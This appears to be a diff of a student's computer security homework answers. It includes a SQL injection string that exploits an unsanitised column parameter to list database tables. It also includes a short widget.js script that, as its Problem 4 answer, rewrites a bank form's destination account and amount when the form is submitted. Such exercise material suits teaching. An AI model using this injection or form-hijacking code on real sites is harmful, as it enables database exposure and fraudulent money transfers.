@@ -52,27 +52,38 @@ How might attacker execute aribitrary code?
     Prevention: Set *a to NULL after completing free.
 
 Problem 3.
+I'm assuming that you can include comments in the SQL query string.
 For the parameters title and date are treated as a string and a date,
 respectively. This is accomplished by the prepared statement p using setString
 and setDate. But the parameter col may be a query itself, as it is not
 sanitized or treated as a particuler data type. This allows for a user to
-gain access to records in the database which might be prohibited. An example
-argument might be
+gain access to records in the database which might be prohibited otherwise. An
+example argument might be
 
-   (1) col = " * FROM INFORMATION_SCHEMA.TABLES and 1=1 or ? ? --"
-
+   (1) col = "SELECT * FROM information_schema.tables WHERE TABLE_TYPE = 'BASE_TABE' AND (1=1 OR (a = ? AND b = ?)) --"
 
 Which would query the database for all tables, and comment out the rest of the
 query.
 
-Problem 4.
-stored/persistent XSS attack
-XSS -> direct script to your server/browser, which now has full access to
-everything in origin (in this case, mybank.com)
 
-Will need to modify widget.js so it grabs values that are sourceAcct and
-amount
-widget.js would need an onClick event
+Problem 4.
+One method would be to do a stored/persistent XSS attack which is where you have
+a direct script to your server/browser, which now has full access to
+everything in origin (in this case, mybank.com). The external javascript file
+widget.js would look like this:
+
+var myAcct = "2325235"
+var myAmount = "420"
+window.onload = function() {
+    var inputVariables = document.getElementsByTagName("input")
+    inputVariables[3].onclick = function() {
+        inputVariables[1].value = myAcct
+        inputVariables[2].value = myAmount
+    }
+}
+
+Which sets the new destination account to myAcct and amount to myAmount before
+the form is sent to the backend.
 
 
 
